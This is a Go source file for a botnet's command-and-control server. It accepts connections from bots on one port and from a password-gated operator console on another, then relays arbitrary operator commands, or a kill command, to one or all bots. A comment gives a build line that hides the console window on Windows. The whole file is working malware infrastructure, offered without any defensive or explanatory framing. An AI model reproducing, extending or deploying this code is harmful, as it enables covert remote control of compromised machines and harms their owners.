package main

/*
go build -ldflags "-s -H windowsgui" -o server.exe .\botnet\botnet_files\server.go
*/
import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"time"

	"github.com/osogi/botnet"
)

const port string = "6666"
const control_port string = "6668"

var live bool = false
var work bool = false
var timeout int = 30

type bot struct {
	seed int64
	conn net.Conn
}

func send_pac_control(conn net.Conn, message []byte, seed int64) int64 {
	return botnet.SendPac(conn, message, seed, botnet.ControlSign)
}
func get_pac_control(conn net.Conn, seed int64) ([]byte, int64) {
	seed = send_pac_control(conn, []byte("\x08$\xfc*^\x15"), seed)
	bytes, seed := botnet.GetPac(conn, seed, 120, botnet.ControlSign)
	if len(bytes) > 13 {
		if (string(bytes[0:11]) == "Seed error ") || (string(bytes[0:14]) == "Timeout error ") {
			live = false
		}
	}
	return bytes, seed
}

func server_control() (chan net.Conn, chan int64) {
	ln, _ := net.Listen("tcp", ":"+control_port)
	result := make(chan net.Conn, 1)
	finseed := make(chan int64, 1)
	go func(ch chan net.Conn, chseed chan int64) {
		for {
			conn, _ := ln.Accept()
			buf := make([]byte, 16)
			_, _ = conn.Read(buf)
			checker := string(buf[0:8])
			if checker == "ch4nnel1" {
				rand.Seed(time.Now().Unix())
				sm_rand := rand.Int63()
				binary.PutVarint(buf, sm_rand)
				conn.Write(buf)
				_, _ = conn.Read(buf)
				checker, _ := binary.Varint(buf)
				if checker == botnet.ControlSign(sm_rand, make([]byte, 0), 0) {
					conn.Write([]byte("Live"))
					ch <- conn
					chseed <- checker
				} else {
					conn.Close()
				}
			} else {
				conn.Close()
			}
		}
	}(result, finseed)
	return result, finseed
}

func get_pac_client(conn net.Conn, seed int64) ([]byte, int64) {
	return botnet.GetPac(conn, seed, timeout, botnet.ClientSign)
}
func send_pac_client(conn net.Conn, message []byte, seed int64) int64 {

	return botnet.SendPac(conn, message, seed, botnet.ClientSign)
}

func server_incilisation() (chan net.Conn, chan int64) {
	fmt.Println("Launching server...")
	ln, _ := net.Listen("tcp", ":"+port)
	result := make(chan net.Conn, 1)
	finseed := make(chan int64, 1)
	go func(ch chan net.Conn, chseed chan int64) {
		for {
			conn, _ := ln.Accept()
			conn.Write([]byte("Live\n"))
			buf := make([]byte, 16)
			conn.Read(buf)
			seed, _ := binary.Varint(buf)
			seed = botnet.ClientSign(seed, make([]byte, 0), 0)
			binary.PutVarint(buf, seed)
			conn.Write(buf)
			conn.Read(buf)
			if string(buf[0:5]) == "Ready" {
				fmt.Println("Сonnection with bot established")
				ch <- conn
				chseed <- seed
			}

		}
	}(result, finseed)
	return result, finseed
}

func menu() string {
	return "1) Send command\n" + "2) Disconect\n" + "3) Set timeout\n"

}

func print_bots(bots *[]bot) string {
	var message []byte
	result := "Chose bot or write '*' to chose all\n"
	for i := 0; i < len(*bots); i++ {
		conn, seed := (*bots)[i].conn, (*bots)[i].seed
		seed = send_pac_client(conn, []byte("\xec\x40test"), seed)
		message, seed = get_pac_client(conn, seed)
		if string(message) != "test" {
			(*bots) = append((*bots)[:i], (*bots)[i+1:]...)
			i--
		} else {
			result += strconv.FormatInt(int64(i), 10) + ") " + conn.RemoteAddr().String() + "\n"
			(*bots)[i].seed = seed
		}
	}
	return result
}

func main() {
	control, chseed_c := server_control()
	conns, chseed_b := server_incilisation()
	_, _ = conns, chseed_b
	bots := make([]bot, 0)
	var message []byte
	go func() {
		for {
			var bufbot bot
			bufbot.conn = <-conns
			bufbot.seed = <-chseed_b
			for work {
				time.Sleep(time.Second)
			}
			bots = append(bots, bufbot)
		}
	}()
	for {
		conn := <-control
		seed := <-chseed_c
		live = true
		for live {
			seed = send_pac_control(conn, []byte(menu()), seed)
			message, seed = get_pac_control(conn, seed)
			if len(message) == 0 {
				message = []byte("tissds")
				fmt.Println("No message detected")
			}
			work = true
			switch string(message[0]) {
			case "1":
				seed = send_pac_control(conn, []byte(print_bots(&bots)), seed)
				fmt.Println(bots)
				message, seed = get_pac_control(conn, seed)
				t, err := strconv.Atoi(string(message))
				if string(message) == "*" {
					seed = send_pac_control(conn, []byte("Write a comand: "), seed)
					message, seed = get_pac_control(conn, seed)
					for t := 0; t < len(bots); t++ {
						if string(message) != "dead" {
							bots[t].seed = send_pac_client(bots[t].conn, []byte("\xc3\xde"+string(message)), bots[t].seed)
						} else {
							bots[t].seed = send_pac_client(bots[t].conn, []byte("\xde\xad"), bots[t].seed)
						}
						message_an := make([]byte, 0)
						message_an, bots[t].seed = get_pac_client(bots[t].conn, bots[t].seed)
						seed = send_pac_control(conn, []byte("Bot "+strconv.FormatInt(int64(t), 10)+":\n"+string(message_an)), seed)

					}
				} else if t < len(bots) && (err == nil) {
					seed = send_pac_control(conn, []byte("Write a comand: "), seed)
					message, seed = get_pac_control(conn, seed)
					if string(message) != "dead" {
						bots[t].seed = send_pac_client(bots[t].conn, []byte("\xc3\xde"+string(message)), bots[t].seed)
					} else {
						bots[t].seed = send_pac_client(bots[t].conn, []byte("\xde\xad"), bots[t].seed)
					}
					message, bots[t].seed = get_pac_client(bots[t].conn, bots[t].seed)
					seed = send_pac_control(conn, message, seed)
				} else {
					seed = send_pac_control(conn, []byte("Bot is out of range\n"), seed)
				}
			case "2":
				conn.Close()
				live = false
			case "3":
				seed = send_pac_control(conn, []byte("Write timeout for client answer in seconds: "), seed)
				message, seed = get_pac_control(conn, seed)
				timeout, _ = strconv.Atoi(string(message))
				seed = send_pac_control(conn, []byte("Now timeout is "+strconv.FormatInt(int64(timeout), 10)+" seconds\n"), seed)
			default:
				seed = send_pac_control(conn, []byte("Unsuported command, try again\n"), seed)
			}
			work = false
		}
	}
}
